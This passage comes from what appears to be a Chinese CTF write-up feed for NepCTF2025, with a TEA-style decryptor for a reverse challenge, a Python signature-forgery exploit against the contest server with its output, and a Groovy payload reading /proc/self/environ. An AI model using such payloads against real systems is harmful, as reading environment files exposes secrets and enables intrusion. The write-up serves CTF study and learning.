tmp2;</span><br><span class="line">        d1 += tmp3;</span><br><span class="line"></span><br><span class="line">        Sum += Delta;</span><br><span class="line"></span><br><span class="line">        tmp1 = ((d1 &lt;&lt; <span class="number">4</span>) ^ (d1 &gt;&gt; <span class="number">5</span>)) + d1;</span><br><span class="line">        tmp2 = Key[((Sum &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0xC</span>) / <span class="number">4</span>] + Sum;</span><br><span class="line">        tmp3 = tmp1 ^ tmp2;</span><br><span class="line">        d2 += tmp3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data[<span class="number">0</span>] = d1;</span><br><span class="line">    data[<span class="number">1</span>] = d2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span><span class="params">(DWORD *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD Key[]&#123;<span class="number">0x3c4ed885</span>, <span class="number">0x12af3e87</span>, <span class="number">0xd6e1b31f</span>, <span class="number">0x25c10aa0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    DWORD Delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line"></span><br><span class="line">    DWORD d1&#123;&#125;, d2&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    d1 = data[<span class="number">0</span>];</span><br><span class="line">    d2 = data[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    DWORD Sum = Delta * <span class="number">0xff</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xff</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        DWORD tmp1&#123;&#125;, tmp2&#123;&#125;, tmp3&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        tmp1 = ((d1 &lt;&lt; <span class="number">4</span>) ^ (d1 &gt;&gt; <span class="number">5</span>)) + d1;</span><br><span class="line">        tmp2 = Key[((Sum &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0xC</span>) / <span class="number">4</span>] + Sum;</span><br><span class="line">        tmp3 = tmp1 ^ tmp2;</span><br><span class="line">        d2 -= tmp3;</span><br><span class="line"></span><br><span class="line">        Sum -= Delta;</span><br><span class="line"></span><br><span class="line">        tmp1 = ((d2 &lt;&lt; <span class="number">4</span>) ^ (d2 &gt;&gt; <span class="number">5</span>)) + d2;</span><br><span class="line">        tmp2 = Key[Sum &amp; <span class="number">3</span>] + Sum;</span><br><span class="line">        tmp3 = tmp1 ^ tmp2;</span><br><span class="line">        d1 -= tmp3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data[<span class="number">0</span>] = d1;</span><br><span class="line">    data[<span class="number">1</span>] = d2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来只需要密文即可，此时多次按g继续执行，然后会再次断在jmp rax处，然后过来会发现这边调用了一个api（下图）。</p><p>然后单步执行到箭头处下面部分，下面会进行多次的qword 8字节比对。</p><p><img src="/2025/07/31/NepCTF2025-XSafe/image-18.png" alt="alt text"></p><p>此时rcx就是输入的十六字节加密后的数据，rcx+rdx地方是密文，上文分析可知密文是48字节，提取rcx+rdx处前48字节，进行解密即可得到Flag。</p><p><img src="/2025/07/31/NepCTF2025-XSafe/image-19.png" alt="alt text"></p><h1 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span><span class="params">(DWORD *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD Key[]&#123;<span class="number">0x3c4ed885</span>, <span class="number">0x12af3e87</span>, <span class="number">0xd6e1b31f</span>, <span class="number">0x25c10aa0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    DWORD Delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line"></span><br><span class="line">    DWORD d1&#123;&#125;, d2&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    d1 = data[<span class="number">0</span>];</span><br><span class="line">    d2 = data[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    DWORD Sum = Delta * <span class="number">0xff</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xff</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        DWORD tmp1&#123;&#125;, tmp2&#123;&#125;, tmp3&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        tmp1 = ((d1 &lt;&lt; <span class="number">4</span>) ^ (d1 &gt;&gt; <span class="number">5</span>)) + d1;</span><br><span class="line">        tmp2 = Key[((Sum &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0xC</span>) / <span class="number">4</span>] + Sum;</span><br><span class="line">        tmp3 = tmp1 ^ tmp2;</span><br><span class="line">        d2 -= tmp3;</span><br><span class="line"></span><br><span class="line">        Sum -= Delta;</span><br><span class="line"></span><br><span class="line">        tmp1 = ((d2 &lt;&lt; <span class="number">4</span>) ^ (d2 &gt;&gt; <span class="number">5</span>)) + d2;</span><br><span class="line">        tmp2 = Key[Sum &amp; <span class="number">3</span>] + Sum;</span><br><span class="line">        tmp3 = tmp1 ^ tmp2;</span><br><span class="line">        d1 -= tmp3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data[<span class="number">0</span>] = d1;</span><br><span class="line">    data[<span class="number">1</span>] = d2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD Enc[]&#123;<span class="number">0x4280669b</span>, <span class="number">0xd6dfe6bb</span>, <span class="number">0x56855b5c</span>, <span class="number">0xc995079b</span>, <span class="number">0x39e0ba30</span>, <span class="number">0xbbe402f0</span>, <span class="number">0x3a9df08b</span>, <span class="number">0x4dd5f7db</span>, <span class="number">0x23767dfa</span>, <span class="number">0x74c33a7f</span>, <span class="number">0x736805af</span>, <span class="number">0xff396149</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">decrypt</span>((DWORD *)((BYTE *)Enc + i * <span class="number">8</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.48s\n&quot;</span>, Enc);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>NepCTF2025{3b213997-d229-42d8-a470-97ebf7d4d029}</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Reverse-XSafe&quot;&gt;&lt;a href=&quot;#Reverse-XSafe&quot; class=&quot;headerlink&quot; title=&quot;Reverse XSafe&quot;&gt;&lt;/a&gt;Reverse XSafe&lt;/h1&gt;&lt;p&gt;这题是这次比赛的零解驱动题，赛中看到是混淆就没有分析</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>NepCTF2025 WP</title>
    <link href="https://tkazer.github.io/2025/07/28/NepCTF2025/"/>
    <id>https://tkazer.github.io/2025/07/28/NepCTF2025/</id>
    <published>2025-07-27T16:40:42.000Z</published>
    <updated>2025-07-30T09:55:15.229Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NepCTF2025-WP"><a href="#NepCTF2025-WP" class="headerlink" title="NepCTF2025 WP"></a>NepCTF2025 WP</h1><p>这次逆向的题目质量都挺好的，各个考点都不错，拿下三个一血和一个三血。</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Nepsign"><a href="#Nepsign" class="headerlink" title="Nepsign"></a>Nepsign</h2><p>Gemini 2.5Pro一把梭。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm3</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> ast <span class="keyword">import</span> literal_eval</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;...&#x27;</span></span><br><span class="line">PORT = <span class="number">443</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SM3</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    d = [i <span class="keyword">for</span> i <span class="keyword">in</span> data]</span><br><span class="line">    h = sm3.sm3_hash(d)</span><br><span class="line">    <span class="keyword">return</span> h</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_steps</span>(<span class="params">msg: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">list</span>[<span class="built_in">int</span>]:</span><br><span class="line">    n = <span class="number">256</span></span><br><span class="line">    hex_symbols = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line">    m = SM3(msg)</span><br><span class="line">    m_bin = <span class="built_in">bin</span>(<span class="built_in">int</span>(m, <span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">256</span>)</span><br><span class="line">    a = [<span class="built_in">int</span>(m_bin[<span class="number">8</span> * i: <span class="number">8</span> * i + <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n // <span class="number">8</span>)]</span><br><span class="line">    </span><br><span class="line">    step = [<span class="number">0</span>] * <span class="number">48</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        step[i] = a[i]</span><br><span class="line">        </span><br><span class="line">    sum_vals = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65</span>):</span><br><span class="line">            <span class="keyword">if</span> m[j - <span class="number">1</span>] == hex_symbols[i]:</span><br><span class="line">                sum_vals[i] += j</span><br><span class="line">        step[i + <span class="number">32</span>] = sum_vals[i] % <span class="number">255</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> step</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, host, port</span>):</span><br><span class="line">        <span class="variable language_">self</span>.host = host</span><br><span class="line">        <span class="variable language_">self</span>.port = port</span><br><span class="line">        </span><br><span class="line">        sock = socket.create_connection((host, port))</span><br><span class="line"> </span><br><span class="line">        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)</span><br><span class="line">        </span><br><span class="line">        context.check_hostname = <span class="literal">False</span></span><br><span class="line">        context.verify_mode = ssl.CERT_NONE</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.r = context.wrap_socket(sock, server_hostname=<span class="variable language_">self</span>.host)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Connected to <span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span> with SSL using SSLContext.&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.r.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">recv_until</span>(<span class="params">self, delim=<span class="string">b&#x27;&gt; &#x27;</span></span>):</span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> data.endswith(delim):</span><br><span class="line">            data += <span class="variable language_">self</span>.r.recv(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sign_message</span>(<span class="params">self, msg_hex: <span class="built_in">str</span></span>) -&gt; <span class="built_in">list</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Asks the server to sign a message and returns the signature.&quot;&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.r.sendall(<span class="string">b&#x27;1\n&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.recv_until(<span class="string">b&#x27;msg: &#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.r.sendall(msg_hex.encode() + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">        response = <span class="variable language_">self</span>.r.recv(<span class="number">4096</span>).decode().strip()</span><br><span class="line">        <span class="variable language_">self</span>.recv_until(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> literal_eval(response)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify_and_get_flag</span>(<span class="params">self, qq: <span class="built_in">list</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Submits the forged signature for verification.&quot;&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.r.sendall(<span class="string">b&#x27;2\n&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.recv_until(<span class="string">b&#x27;give me a qq: &#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.r.sendall(<span class="built_in">str</span>(qq).encode() + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">        flag = <span class="variable language_">self</span>.r.recv(<span class="number">1024</span>).decode()</span><br><span class="line">        <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        target_msg = <span class="string">b&#x27;happy for NepCTF 2025&#x27;</span></span><br><span class="line">        target_steps = get_steps(target_msg)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Target message: <span class="subst">&#123;target_msg.decode()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Required step values calculated.&quot;</span>)</span><br><span class="line"></span><br><span class="line">        final_qq = [<span class="literal">None</span>] * <span class="number">48</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">48</span>), desc=<span class="string">&quot;[*] Forging signature parts&quot;</span>):</span><br><span class="line">            nonce_counter = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                forge_msg = os.urandom(<span class="number">16</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> forge_msg == target_msg:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                current_steps = get_steps(forge_msg)</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> current_steps[i] == target_steps[i]:</span><br><span class="line">                    qq_forge = <span class="variable language_">self</span>.sign_message(forge_msg.<span class="built_in">hex</span>())</span><br><span class="line">                    </span><br><span class="line">                    final_qq[i] = qq_forge[i]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">                nonce_counter += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n[+] Successfully forged all 48 signature parts.&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Submitting final signature for verification...&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(final_qq)</span><br><span class="line">        flag = <span class="variable language_">self</span>.verify_and_get_flag(final_qq)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;🏁 FLAG: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.r.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> gmssl</span><br><span class="line">    <span class="keyword">except</span> ImportError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Please install the required &#x27;gmssl&#x27; library: pip install gmssl&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line">        </span><br><span class="line">    exploit = Exploit(HOST,PORT)</span><br><span class="line">    exploit.run()</span><br><span class="line"></span><br><span class="line"><span class="comment"># [*] Connected to nepctf31-d0qf-gter-lpkh-eq4whjx91414.nepctf.com:443 with SSL using SSLContext.</span></span><br><span class="line"><span class="comment"># [*] Target message: happy for NepCTF 2025</span></span><br><span class="line"><span class="comment"># [*] Required step values calculated.</span></span><br><span class="line"><span class="comment"># [*] Forging signature parts: 100%|███████████████████| 48/48 [05:27&lt;00:00,  6.82s/it]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] Successfully forged all 48 signature parts.</span></span><br><span class="line"><span class="comment"># [*] Submitting final signature for verification...</span></span><br><span class="line"><span class="comment"># [&#x27;39b010ac6302a552f2b377dfdbd0125e4dcaf8c94cf838bb8b139e79d09ddcec&#x27;, &#x27;8f12c96114d5fcfa639c7d9fb6e9a953ec967fa30a04518ec49414d310bcedee&#x27;, &#x27;fa7538447f0da0558ec30fe5bdde244127959aedac4b32669a7e22baa19e3ed6&#x27;, &#x27;a2c8d562f8bc749f7e9fe7f5f4141c2006207b1b5550ae05beccfbaf0f53fe75&#x27;, &#x27;c1c9bf6d40ed4e14dd18ab9dd0bbbcad0dcdc4f12d8553fd30c7bb3f86c589aa&#x27;, &#x27;05c8b9552e5e283ac0cee392807fdf7d1b98ae3538bd5ab0fd24a43f39c3a3c8&#x27;, &#x27;78c8d76a69d1c5dd3563112a26271fa75730c8197597eabb7ffb9d64282f12ac&#x27;, &#x27;4a23e84f467275db471b688e4e2fec0a0a435538a3766c3a5427debc95fab1d3&#x27;, &#x27;85703b8a4050b34786ae994d1585944b711e7d5e6d474a3f4b0ac827bd1b4d46&#x27;, &#x27;3280cfb408907e20292d0d702c4046e5f79b828142a36f1820e8b58b9a9c269e&#x27;, &#x27;06fee77bb993584f78098ad550c9baf7eeb55d91526de2d4454dc4a1d2c2aa6f&#x27;, &#x27;79d2f0bafc01ed11e1c5a772ab33cb31f49648680a5933e0a3c8993bfa3e6e0b&#x27;, &#x27;84446dccf736fff63e7d9914c39976d08b7db7bd47c0fa42acfe21179f248553&#x27;, &#x27;b3c9d0724f7ca087dbf3283435c98888fbbb17db1f50215764d893c18850e1ad&#x27;, &#x27;9728c58f692e84c0122f8d009a2e58ac560bef50ee1566b5b2d0ccfea1159e9d&#x27;, &#x27;8bcd86f395b95ae16ab5ecad8e386f7f98b6fe829b6fbce1e83dc05dfd210017&#x27;, &#x27;762c94adeb5167fc3df441ba83d8a8af68359579e368a568897fbb540784f225&#x27;, &#x27;5d9d1f0b253eb1d4f5d289d393bc0ed0b7ce89a61d073a113088f3a7a8c06acb&#x27;, &#x27;cf24458be2e5f05f53ebdf54c848be56632a49e3a88d58221bae4be14856e9df&#x27;, &#x27;b0001d89142d2add384e3c4c236a743b345aa306d4f23e5689c73c43eab6d089&#x27;, &#x27;d62e08c88c402456b46e5d75e66a5d37e1b606d88e0bc6b2399d2ad19795025f&#x27;, &#x27;b2a30ead02ff626ee69b4c82a7c34c3376615352775d0ff317fcf9b88d4a082b&#x27;, &#x27;27f04230c2f63eba8bd3c3166620a97c91e125eb21c5b70d7ff19a338880d1ed&#x27;, &#x27;15d1668d22e79aa2ed3cec99a000738aa5a00466f0d5fe9e7a0ccb5d125e5694&#x27;, &#x27;3852b4c577b06d584149ed18a5f40f928852738b0d6969926b6408af5ae3a03a&#x27;, &#x27;2d92db3406e756b2914148350755186419d87648fdd52a7928e4579c7cd60c03&#x27;, &#x27;49908b6da8adcfde75ab89901ee81b4a7be69536d07ad446a23336df3b250cfa&#x27;, &#x27;f16d19be270a5f2d27a9fabb4e71cdb60775e97724c880483fec6e1a96097f8e&#x27;, &#x27;376f05bed3c4e6830086fe3dabe7739cddbc8404a5423a740b1a3a8e0344a0c9&#x27;, &#x27;86bca065c621d9450f1ab47f7d7d093006cabf741f959aa14c8581f3bfbb5f40&#x27;, &#x27;4551b1f456875b82962c13dcb34f697911761bb8caf387036c9492f1a9c082b9&#x27;, &#x27;42ebce9edc6fd9513c6cdc69fd7f16e106a3d46c9908db96e01df593d2cb07b2&#x27;, &#x27;9b6e783aee1ffbea5a7d16642beaca54388511aaf4303f1193f132f69bfa650b&#x27;, &#x27;11473c8fb9d395f743c0210b731b6fb42d2e7ca99b1f06ca8fe01e4f6790f55f&#x27;, &#x27;eefa9bf5925c00244c5b7910da62098c6dc35cf1f282a64ad44c9e758aba6de8&#x27;, &#x27;825e7a8a6d1909e602a820ada46488905a6163d88551af71b1b2fe5c32a8de9a&#x27;, &#x27;47c381462cde495eb7cf484464f65d821df89183479a3a8b51890110c67b1e68&#x27;, &#x27;b83a6dd98d5b64f46f2a62a4eff1d6f5ed89a61d0d6e17aaee7c29797cbf1acd&#x27;, &#x27;9019e02438e0113cd3fa9fd336ef511195e94c5163f2b3c6a881cefe8e653a89&#x27;, &#x27;966cb62f086f2f3ada010cc9f34d760109629580416fc11dc38f1c90b386f408&#x27;, &#x27;975c033da39a76eecd8a45adcee1097ace7c7f4d45344ac533cb78047a2f6d19&#x27;, &#x27;69ba0387f210c6444c0fad1161d47467973a7ff5dcaeb5f48dc6bbcf5cc657e0&#x27;, &#x27;583873a985f570097c0dfa418408009731bf07ee366364ac070ffc6c23bb3865&#x27;, &#x27;797e77020143e42eee3b9e1b7a6bc3d1c6d50a13989db041fe1f15b389eaceaa&#x27;, &#x27;683ba0fe4a480a12997f14ec664f389e13e5914978621f735fd0d9ad813fe2aa&#x27;, &#x27;a60bb1ca5235d3301b08844b22a058ef11966de77a66f4ef502794f7a9cd2fbd&#x27;, &#x27;227edd3ef3443f9368e6b76d7fb2d3a298c1b4e5d1e57551a8f18a3a9fed45ed&#x27;, &#x27;52e4b8362c85ef9af83099242887bac6db4e937de7b0c817d0a229d68cdaefda&#x27;]    </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================================================</span></span><br><span class="line"><span class="comment"># 🏁 FLAG: NepCTF&#123;d6a4a58b-8b11-2ba3-4aa2-7643d50d25b6&#125;</span></span><br><span class="line"><span class="comment"># ==================================================</span></span><br></pre></td></tr></table></figure><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="easyGooGooVVVV"><a href="#easyGooGooVVVV" class="headerlink" title="easyGooGooVVVV"></a>easyGooGooVVVV</h2><p>Gemini 2.5Pro</p><p><img src="/2025/07/28/NepCTF2025/46b253d5-c5b2-4b63-99da-c6a186170a32.png" alt="alt text"></p><p>exp:<br><code>this.getClass().getClassLoader().getResource(&quot;file:///proc/self/environ&quot;).text</code></p><h2 id="RevengeGooGooVVVY"><a href="#RevengeGooGooVVVY" class="headerlink" title="RevengeGooGooVVVY"></a>RevengeGooGooVVVY</h2><p>同上EXP。</p><p>exp:<br><code>this.getClass().getClassLoader().getResource(&quot;file:///proc/self/environ&quot;).text</code></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="NepBotEvent"><a href="#NepBotEvent" class="headerlink" title="NepBotEvent"></a>NepBotEvent</h2><p>从题目以及文件结构可分析出是input_event结构体数据。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">input_event</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">timeval</span> time;</span><br><span class="line">    __u16 type;</span><br><span class="line">    __u16 code;</span><br><span class="line">    __s32 value;</span><br><span 